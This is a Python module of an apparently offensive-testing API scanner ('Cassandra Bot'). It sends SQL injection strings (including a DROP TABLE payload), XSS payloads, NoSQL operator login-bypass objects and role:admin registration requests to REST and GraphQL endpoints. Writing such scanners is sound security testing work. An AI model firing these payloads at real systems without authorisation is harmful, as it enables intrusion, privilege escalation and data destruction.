"""Cassandra Bot — API 스캐너 (REST/GraphQL)."""
import httpx
import json
from typing import Optional
from core.models import Asset, Endpoint, Finding
from core.logger import get_logger

log = get_logger("scanner.api")


# ── REST API ──────────────────────────────────────────────────────────

def scan_rest_auth(base_url: str, endpoints: list[str], auth_header: Optional[str] = None) -> list[Finding]:
    """REST API: auth bypass, missing auth."""
    findings = []
    headers = {"User-Agent": "Mozilla/5.0 (compatible; CassandraBot/0.1)"}

    for endpoint in endpoints:
        url = endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}"

        # Try without auth
        try:
            resp_no_auth = httpx.get(url, headers=headers, timeout=10)

            # If 200 without auth, potential missing auth
            if resp_no_auth.status_code == 200 and len(resp_no_auth.text) > 50:
                # Check if it returns sensitive data
                text_lower = resp_no_auth.text.lower()
                if any(kw in text_lower for kw in ["user", "email", "password", "token", "id", "name"]):
                    findings.append(Finding(
                        vuln_type="api_missing_auth",
                        severity="medium",
                        endpoint=url,
                        method="GET",
                        evidence=f"API endpoint {endpoint} returns 200 without auth",
                        poc_request={"method": "GET", "url": url, "headers": headers},
                        raw_data={"status_code": resp_no_auth.status_code},
                    ))
        except Exception:
            continue

        # Try with different auth headers (if provided)
        if auth_header:
            try:
                headers_with_auth = {**headers, "Authorization": auth_header}
                resp_with_auth = httpx.get(url, headers=headers_with_auth, timeout=10)

                # If different response with auth, potential auth bypass
                if resp_no_auth.status_code == resp_with_auth.status_code:
                    if resp_no_auth.text != resp_with_auth.text:
                        findings.append(Finding(
                            vuln_type="api_auth_bypass",
                            severity="high",
                            endpoint=url,
                            method="GET",
                            evidence=f"Auth bypass: different response with/without auth on {endpoint}",
                            poc_request={"method": "GET", "url": url, "headers": headers},
                            raw_data={"no_auth_status": resp_no_auth.status_code, "with_auth_status": resp_with_auth.status_code},
                        ))
            except Exception:
                continue

    return findings


def scan_rest_rate_limit(base_url: str, endpoint: str) -> list[Finding]:
    """REST API: rate limit bypass."""
    findings = []
    url = endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}"
    headers = {"User-Agent": "Mozilla/5.0 (compatible; CassandraBot/0.1)"}

    # Send 10 requests quickly
    status_codes = []
    for i in range(10):
        try:
            resp = httpx.get(url, headers=headers, timeout=5)
            status_codes.append(resp.status_code)
        except Exception:
            status_codes.append(None)

    # If all 200, no rate limit
    if all(code == 200 for code in status_codes if code is not None):
        findings.append(Finding(
            vuln_type="api_no_rate_limit",
            severity="low",
            endpoint=url,
            method="GET",
            evidence=f"No rate limit: 10/10 requests returned 200",
            poc_request={"method": "GET", "url": url, "headers": headers},
            raw_data={"status_codes": status_codes},
        ))

    return findings


def scan_rest_injection(base_url: str, endpoint: str, params: dict[str, str]) -> list[Finding]:
    """REST API: injection (SQLi, XSS, etc.)."""
    findings = []
    url = endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}"
    headers = {"User-Agent": "Mozilla/5.0 (compatible; CassandraBot/0.1)"}

    # SQLi payloads
    sqli_payloads = ["' OR 1=1--", "1 UNION SELECT NULL--", "'; DROP TABLE users;--"]
    for param in params:
        for payload in sqli_payloads:
            test_params = dict(params)
            test_params[param] = payload
            try:
                resp = httpx.get(url, params=test_params, headers=headers, timeout=10)
                text_lower = resp.text.lower()
                if any(kw in text_lower for kw in ["sql", "syntax", "error", "warning"]):
                    findings.append(Finding(
                        vuln_type="api_sqli",
                        severity="high",
                        endpoint=f"{url}?{param}={payload}",
                        method="GET",
                        evidence=f"SQLi in API: {param}={payload}",
                        poc_request={"method": "GET", "url": url, "params": test_params, "headers": headers},
                        raw_data={"status_code": resp.status_code},
                    ))
                    break
            except Exception:
                continue

    return findings


# ── API body injection (POST/PUT JSON) ───────────────────────────────

API_BODY_FIELDS = [
    "name", "username", "email", "message", "description",
    "firstName", "lastName", "comment", "title", "content",
]

API_BODY_XSS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
]

API_BODY_SQLI = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
]


def scan_api_body(base_url: str, endpoint: str, client: Optional[httpx.Client] = None) -> list[Finding]:
    """API: POST/PUT JSON body 로 XSS/SQLi 주입.

    REST API의 취약점은 GET query가 아니라 body에 있다 (Juice Shop 등).
    200 + payload 반사 또는 SQL error 신호로 탐지.
    """
    own_client = client is None
    if own_client:
        client = httpx.Client(timeout=10, follow_redirects=True)
    findings = []
    url = endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}"

    # Baseline: GET 으로 현재 상태 (item endpoint) 또는 list 확인
    try:
        baseline = client.get(url, timeout=10)
    except Exception:
        baseline = None

    for method in ("POST", "PUT"):
        for field in API_BODY_FIELDS:
            for payload, vuln in [(p, "xss") for p in API_BODY_XSS] + [(p, "sqli") for p in API_BODY_SQLI]:
                body = {field: payload}
                try:
                    resp = client.request(method, url, json=body, timeout=10)
                except Exception:
                    continue
                if resp.status_code >= 400:
                    continue
                text = resp.text
                # XSS: payload가 응답에 반사
                if vuln == "xss" and payload in text:
                    findings.append(Finding(
                        vuln_type="xss",
                        severity="medium",
                        endpoint=url,
                        method=method,
                        evidence=f"Reflected XSS in API body: {field}={payload!r} reflected in {method} response",
                        poc_request={"method": method, "url": url, "body": body},
                        raw_data={"status_code": resp.status_code},
                    ))
                # SQLi: SQL error 신호
                elif vuln == "sqli":
                    text_lower = text.lower()
                    if any(kw in text_lower for kw in ["sql", "syntax", "mysql", "sqlite", "pgsql", "unterminated"]):
                        findings.append(Finding(
                            vuln_type="sqli",
                            severity="high",
                            endpoint=url,
                            method=method,
                            evidence=f"SQL error in API body: {field}={payload!r}",
                            poc_request={"method": method, "url": url, "body": body},
                            raw_data={"status_code": resp.status_code, "snippet": text[:200]},
                        ))
    if own_client:
        client.close()
    return findings


# ── NoSQL injection (login/registration) ─────────────────────────────

# NoSQL operator payloads — JSON body field에 object 주입
NOSQLI_OPERATORS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$or": [[{"$ne": None}]]},
]

# 로그인/인증 endpoint 경로 패턴 (일반화: path에 login/auth/session 포함)
LOGIN_PATH_HINTS = ["login", "logon", "signin", "sign-in", "auth", "session", "token"]

# 사용자 등록 endpoint 경로 패턴
REGISTER_PATH_HINTS = ["register", "signup", "sign-up", "users", "account"]


def _is_login_endpoint(url: str) -> bool:
    path = url.lower().split("?", 1)[0]
    return any(h in path for h in LOGIN_PATH_HINTS)


def _is_register_endpoint(url: str) -> bool:
    path = url.lower().split("?", 1)[0]
    return any(h in path for h in REGISTER_PATH_HINTS)


def scan_nosqli(base_url: str, client: Optional[httpx.Client] = None) -> list[Finding]:
    """NoSQL injection: login/registration endpoint에 operator object 주입.

    일반화: (1) crawled endpoint 중 login/auth 경로, (2) common login 경로 probe.
    탐지: baseline(정상 문자열) vs operator payload → status code 차이
    (401 vs 500/200) 또는 성공 응답.
    """
    own_client = client is None
    if own_client:
        client = httpx.Client(timeout=10, follow_redirects=True)
    findings = []

    # login endpoint 후보: common 경로 (crawled endpoint는 scan_api에서 전달)
    candidates = [
        "/rest/user/login", "/rest/users/login", "/rest/login",
        "/api/login", "/api/users/login", "/login", "/auth/login",
    ]

    for path in candidates:
        url = base_url.rstrip("/") + path
        # baseline: 정상 문자열 credential
        baseline = None
        try:
            baseline = client.post(url, json={"email": "probe@cassandra.local", "password": "probe-pass-123"}, timeout=10)
        except Exception:
            continue
        if baseline.status_code == 404 or "unexpected path" in baseline.text.lower():
            continue  # endpoint가 아님

        for op in NOSQLI_OPERATORS:
            for field in ("email", "username", "password"):
                body = {"email": "probe@cassandra.local", "password": "probe-pass-123"}
                body[field] = op
                try:
                    resp = client.post(url, json=body, timeout=10)
                except Exception:
                    continue
                # 탐지: baseline과 status 다름 (401→500/200) 또는 성공
                if resp.status_code != baseline.status_code:
                    if resp.status_code in (200, 201):
                        sev, note = "high", "login bypass (200/201)"
                    else:
                        sev, note = "medium", f"operator anomaly ({baseline.status_code}→{resp.status_code})"
                    findings.append(Finding(
                        vuln_type="nosqli",
                        severity=sev,
                        endpoint=url,
                        method="POST",
                        evidence=f"NoSQLi in {field}: {op} → {resp.status_code} (baseline {baseline.status_code}, {note})",
                        poc_request={"method": "POST", "url": url, "body": body},
                        raw_data={"baseline_status": baseline.status_code, "nosqli_status": resp.status_code},
                    ))
                    break  # 이 endpoint에서 한 개만
            else:
                continue
            break  # 이 endpoint에서 한 개만

    if own_client:
        client.close()
    return findings


def scan_admin_registration(base_url: str, client: Optional[httpx.Client] = None) -> list[Finding]:
    """Admin registration: user registration endpoint에 role:admin 주입.

    일반화: (1) crawled endpoint 중 register/users 경로, (2) common 경로 probe.
    탐지: POST role:admin → 201/200 + 응답에 role:admin.
    """
    own_client = client is None
    if own_client:
        client = httpx.Client(timeout=10, follow_redirects=True)
    findings = []

    candidates = [
        "/api/Users", "/api/users", "/rest/users", "/rest/user",
        "/api/Customers", "/api/register", "/register", "/api/account",
    ]

    for path in candidates:
        url = base_url.rstrip("/") + path
        email = f"probe-{int(__import__('time').time())}@cassandra.local"
        body = {"email": email, "password": "probe-pass-123", "role": "admin"}
        try:
            resp = client.post(url, json=body, timeout=10)
        except Exception:
            continue
        if resp.status_code in (200, 201):
            text = resp.text.lower()
            if '"role":"admin"' in text.replace(" ", "") or "role" in text and "admin" in text:
                findings.append(Finding(
                    vuln_type="admin_registration",
                    severity="high",
                    endpoint=url,
                    method="POST",
                    evidence=f"Admin registration: POST role:admin → {resp.status_code}, role:admin in response",
                    poc_request={"method": "POST", "url": url, "body": body},
                    raw_data={"status_code": resp.status_code, "snippet": resp.text[:200]},
                ))

    if own_client:
        client.close()
    return findings


def scan_openapi(base_url: str, client: Optional[httpx.Client] = None) -> list[Finding]:
    """OpenAPI/Swagger spec 자동 탐지.

    일반화: common spec 경로 probe. Content-Type=application/json +
    openapi/swagger 키 확인 (SPA HTML 폴백 제거).
    """
    own_client = client is None
    if own_client:
        client = httpx.Client(timeout=10, follow_redirects=True)
    findings = []

    spec_paths = [
        "/openapi.json", "/swagger.json", "/swagger.yaml",
        "/api/openapi.json", "/api/swagger.json", "/api-docs",
        "/b2b/v2/swagger.json", "/b2b/v2/openapi.json",
    ]

    for path in spec_paths:
        url = base_url.rstrip("/") + path
        try:
            resp = client.get(url, timeout=10)
        except Exception:
            continue
        ct = resp.headers.get("Content-Type", "")
        if resp.status_code != 200 or "json" not in ct and "yaml" not in ct:
            continue
        text = resp.text
        if "openapi" in text.lower() or "swagger" in text.lower():
            findings.append(Finding(
                vuln_type="openapi_exposed",
                severity="low",
                endpoint=url,
                method="GET",
                evidence=f"OpenAPI/Swagger spec exposed: {path} ({len(text)} bytes)",
                poc_request={"method": "GET", "url": url},
                raw_data={"status_code": resp.status_code, "content_type": ct},
            ))

    if own_client:
        client.close()
    return findings


# ── GraphQL ───────────────────────────────────────────────────────────

def scan_graphql_introspection(base_url: str, endpoint: str = "/graphql") -> list[Finding]:
    """GraphQL: introspection query."""
    findings = []
    url = endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}"
    headers = {"Content-Type": "application/json"}

    introspection_query = """
    {
      __schema {
        queryType { name }
        mutationType { name }
        types { name }
      }
    }
    """

    try:
        resp = httpx.post(url, json={"query": introspection_query}, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if "data" in data and "__schema" in data["data"]:
                types = data["data"]["__schema"].get("types", [])
                findings.append(Finding(
                    vuln_type="graphql_introspection",
                    severity="low",
                    endpoint=url,
                    method="POST",
                    evidence=f"GraphQL introspection enabled: {len(types)} types exposed",
                    poc_request={"method": "POST", "url": url, "body": introspection_query, "headers": headers},
                    raw_data={"type_count": len(types)},
                ))
    except Exception:
        pass

    return findings


def scan_graphql_batching(base_url: str, endpoint: str = "/graphql") -> list[Finding]:
    """GraphQL: batching (array of queries)."""
    findings = []
    url = endpoint if endpoint.startswith("http") else f"{base_url}{endpoint}"
    headers = {"Content-Type": "application/json"}

    # Try batching
    batch_query = [
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
    ]

    try:
        resp = httpx.post(url, json=batch_query, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, list):
                findings.append(Finding(
                    vuln_type="graphql_batching",
                    severity="low",
                    endpoint=url,
                    method="POST",
                    evidence="GraphQL batching enabled",
                    poc_request={"method": "POST", "url": url, "body": batch_query, "headers": headers},
                    raw_data={"response_count": len(data)},
                ))
    except Exception:
        pass

    return findings


# ── 메인 스캔 함수 ────────────────────────────────────────────────────

def scan_api(asset: Asset) -> list[Finding]:
    """API 스캔: REST + GraphQL + NoSQLi + admin registration + OpenAPI."""
    findings = []
    # base_url 우선 (test_live는 Asset(base_url=...)), 없으면 domain
    base_url = asset.base_url if asset.base_url else (f"https://{asset.domain}" if asset.domain and not asset.domain.startswith("http") else asset.domain)

    # NoSQLi / admin registration / OpenAPI — base_url 단위 (endpoint 불필요)
    findings.extend(scan_nosqli(base_url))
    findings.extend(scan_admin_registration(base_url))
    findings.extend(scan_openapi(base_url))

    for endpoint in asset.endpoints:
        # Endpoint 객체 또는 문자열 지원
        ep_url = endpoint.url if isinstance(endpoint, Endpoint) else endpoint
        # REST
        if "/api/" in ep_url or "/graphql" in ep_url:
            params = {}
            if "?" in ep_url:
                query = ep_url.split("?", 1)[1]
                for pair in query.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        params[k] = v

            findings.extend(scan_rest_auth(base_url, [ep_url]))
            findings.extend(scan_rest_rate_limit(base_url, ep_url))
            if params:
                findings.extend(scan_rest_injection(base_url, ep_url, params))
            # API body injection (POST/PUT JSON) — REST API 취약점은 body에 있다
            if "/api/" in ep_url:
                findings.extend(scan_api_body(base_url, ep_url))

        # GraphQL
        if "/graphql" in ep_url:
            findings.extend(scan_graphql_introspection(base_url, ep_url))
            findings.extend(scan_graphql_batching(base_url, ep_url))

    return findings
